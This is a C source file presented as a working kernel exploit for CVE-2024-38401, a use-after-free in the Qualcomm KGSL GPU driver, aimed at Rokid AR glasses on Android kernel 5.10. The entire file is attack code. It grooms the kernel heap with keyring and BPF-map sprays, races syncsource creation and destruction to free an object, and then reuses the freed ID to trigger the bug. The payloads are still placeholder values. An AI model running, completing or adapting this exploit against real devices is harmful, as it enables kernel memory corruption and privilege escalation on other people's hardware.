/*
 * CVE-2024-38401 KGSL UAF Exploit v8 - Keyring + Cross-Cache Attack
 * ===================================================================
 *
 * Strategy:
 * 1. Use user_key_payload for heap spray (via add_key syscall)
 * 2. Combine with BPF maps for cross-cache coverage
 * 3. Implement slab exhaustion to force reuse
 * 4. Target the specific slab where kgsl_syncsource lives
 *
 * Key insight: SLAB_FREELIST_HARDENED makes simple overwrites harder,
 * but cross-cache attacks and type confusion are still possible.
 *
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209, ARM64)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <linux/keyctl.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09
#define KGSL_IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define KGSL_IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

struct kgsl_syncsource_create
{
    unsigned int id;
};
struct kgsl_syncsource_destroy
{
    unsigned int id;
};
struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};
struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

// ============================================================================
// Keyring Spray
// ============================================================================

#ifndef __NR_add_key
#define __NR_add_key 217
#endif

#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING -2
#endif

#ifndef KEYCTL_REVOKE
#define KEYCTL_REVOKE 3
#endif

#ifndef KEYCTL_UNLINK
#define KEYCTL_UNLINK 9
#endif

static int add_key(const char *type, const char *desc,
                   const void *payload, size_t plen, int keyring)
{
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

static int keyctl_revoke(int key)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key);
}

static int keyctl_unlink(int key, int keyring)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, key, keyring);
}

// ============================================================================
// BPF Spray
// ============================================================================

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static int bpf_create_map(int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_HASH,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = BPF_NOEXIST,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// ============================================================================
// Globals
// ============================================================================

int kgsl_fd = -1;

// Key spray
#define MAX_KEYS 1024
int spray_keys[MAX_KEYS];
int num_keys = 0;

// BPF spray
#define NUM_BPF_MAPS 32
#define ENTRIES_PER_MAP 1024
int bpf_fds[NUM_BPF_MAPS];
int num_bpf_fds = 0;
int bpf_key = 0;

// Target sizes for syncsource
// We need to determine the actual size - trying multiple
#define NUM_SIZES 4
int target_sizes[NUM_SIZES] = {64, 96, 128, 192};

volatile int running = 1;

// ============================================================================
// Spray Payloads
// ============================================================================

void craft_payload(char *buf, int size)
{
    memset(buf, 0x41, size);

    // Fake kref at offset 0
    ((uint32_t *)buf)[0] = 0x7FFFFFFF; // High refcount

    // Fake pointers
    if (size >= 16)
        ((uint64_t *)buf)[1] = 0xDEADBEEF00000001ULL;
    if (size >= 24)
        ((uint64_t *)buf)[2] = 0xCAFEBABE00000002ULL;
    if (size >= 32)
        ((uint64_t *)buf)[3] = 0xBEEFCAFE00000003ULL;
    if (size >= 40)
        ((uint64_t *)buf)[4] = 0xFEEDFACE00000004ULL;
}

// ============================================================================
// Spray Functions
// ============================================================================

int spray_keyring(int size, int count)
{
    char desc[32];
    char *payload = malloc(size);
    if (!payload)
        return 0;

    craft_payload(payload, size);

    int created = 0;
    for (int i = 0; i < count && num_keys < MAX_KEYS; i++)
    {
        snprintf(desc, sizeof(desc), "spray_%d_%d", size, num_keys);
        int key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
        if (key >= 0)
        {
            spray_keys[num_keys++] = key;
            created++;
        }
    }

    free(payload);
    return created;
}

void free_keys(int count)
{
    for (int i = 0; i < count && num_keys > 0; i++)
    {
        int key = spray_keys[--num_keys];
        keyctl_revoke(key);
        keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING);
    }
}

int setup_bpf_spray(int value_size)
{
    for (int i = 0; i < NUM_BPF_MAPS; i++)
    {
        int fd = bpf_create_map(sizeof(int), value_size, ENTRIES_PER_MAP);
        if (fd >= 0)
        {
            bpf_fds[num_bpf_fds++] = fd;
        }
    }
    return num_bpf_fds;
}

void spray_bpf(char *payload, int size, int count)
{
    for (int i = 0; i < count; i++)
    {
        bpf_key++;
        for (int m = 0; m < num_bpf_fds; m++)
        {
            bpf_update_map(bpf_fds[m], &bpf_key, payload);
        }
    }
}

// ============================================================================
// Slab Exhaustion Attack
// ============================================================================

void exhaust_and_race(int iterations)
{
    char payload[256];

    for (int size_idx = 0; size_idx < NUM_SIZES; size_idx++)
    {
        int size = target_sizes[size_idx];
        printf("\n[*] Testing size %d (kmalloc-%d)...\n", size,
               size <= 64 ? 64 : size <= 96 ? 96
                             : size <= 128  ? 128
                                            : 192);

        craft_payload(payload, size);

        for (int i = 0; i < iterations && running; i++)
        {
            // Phase 1: Create many syncsources to pressure the slab
            struct kgsl_syncsource_create creates[16];
            int num_created = 0;

            for (int j = 0; j < 16; j++)
            {
                creates[j].id = 0;
                if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE, &creates[j]) == 0)
                {
                    num_created++;
                }
            }

            // Phase 2: Create fence for last one
            if (num_created > 0)
            {
                struct kgsl_syncsource_create_fence fence = {
                    .id = creates[num_created - 1].id};

                if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &fence) == 0)
                {
                    // Phase 3: Destroy all syncsources
                    for (int j = 0; j < num_created; j++)
                    {
                        struct kgsl_syncsource_destroy destroy = {.id = creates[j].id};
                        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);
                    }

                    // Phase 4: Close fence (triggers FREE for last syncsource)
                    close(fence.fencefd);

                    // Phase 5: Aggressive spray with current size
                    spray_keyring(size, 20);
                    spray_bpf(payload, size, 10);

                    // Phase 6: Try to use freed syncsource
                    struct kgsl_syncsource_signal_fence sig = {
                        .id = creates[num_created - 1].id,
                        .fencefd = -1};
                    ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig);

                    // Phase 7: Try create_fence on freed ID
                    struct kgsl_syncsource_create_fence cf = {
                        .id = creates[num_created - 1].id};
                    if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &cf) == 0)
                    {
                        printf("[!!!] UAF detected at size %d, iteration %d!\n", size, i);
                        if (cf.fencefd > 0)
                            close(cf.fencefd);
                    }
                }
                else
                {
                    // Cleanup if fence failed
                    for (int j = 0; j < num_created; j++)
                    {
                        struct kgsl_syncsource_destroy destroy = {.id = creates[j].id};
                        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);
                    }
                }
            }

            // Periodically free keys to cycle memory
            if (i % 100 == 99)
            {
                free_keys(num_keys / 2);
            }

            if (i % 500 == 0)
            {
                printf("\r  [%d] iter=%d keys=%d bpf_keys=%d",
                       size, i, num_keys, bpf_key);
                fflush(stdout);
            }
        }

        // Cleanup this size
        free_keys(num_keys);
    }
}

// ============================================================================
// Main
// ============================================================================

void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
}

int main(int argc, char **argv)
{
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("  CVE-2024-38401 KGSL UAF Exploit v8 - Keyring + Cross-Cache   \n");
    printf("  Target: Rokid AR Glasses (Kernel 5.10.209)                   \n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    signal(SIGINT, sigint_handler);

    int iterations = 2000;
    if (argc > 1)
        iterations = atoi(argv[1]);

    // Open KGSL
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0\n");

    // Test keyring
    int test_key = add_key("user", "test", "test", 4, KEY_SPEC_PROCESS_KEYRING);
    if (test_key < 0)
    {
        printf("[-] add_key failed: %s\n", strerror(errno));
        printf("[-] Keyring spray not available, using BPF only\n");
    }
    else
    {
        keyctl_revoke(test_key);
        keyctl_unlink(test_key, KEY_SPEC_PROCESS_KEYRING);
        printf("[+] Keyring spray available\n");
    }

    // Setup BPF
    int bpf = setup_bpf_spray(96); // Middle size
    printf("[+] Created %d BPF maps\n", bpf);

    printf("\n[*] Starting cross-cache exhaustion attack (%d iterations per size)...\n", iterations);

    exhaust_and_race(iterations);

    printf("\n\n═══════════════════════════════════════════════════════════════\n");
    printf("  Final Stats:\n");
    printf("  - Keys created: %d\n", num_keys);
    printf("  - BPF spray keys: %d\n", bpf_key);
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("\n[*] Check kernel log:\n");
    printf("    dmesg | grep -iE 'kgsl|deadbeef|panic|BUG|slub|UAF|kasan'\n");

    // Cleanup
    free_keys(num_keys);
    close(kgsl_fd);
    for (int i = 0; i < num_bpf_fds; i++)
        close(bpf_fds[i]);

    return 0;
}
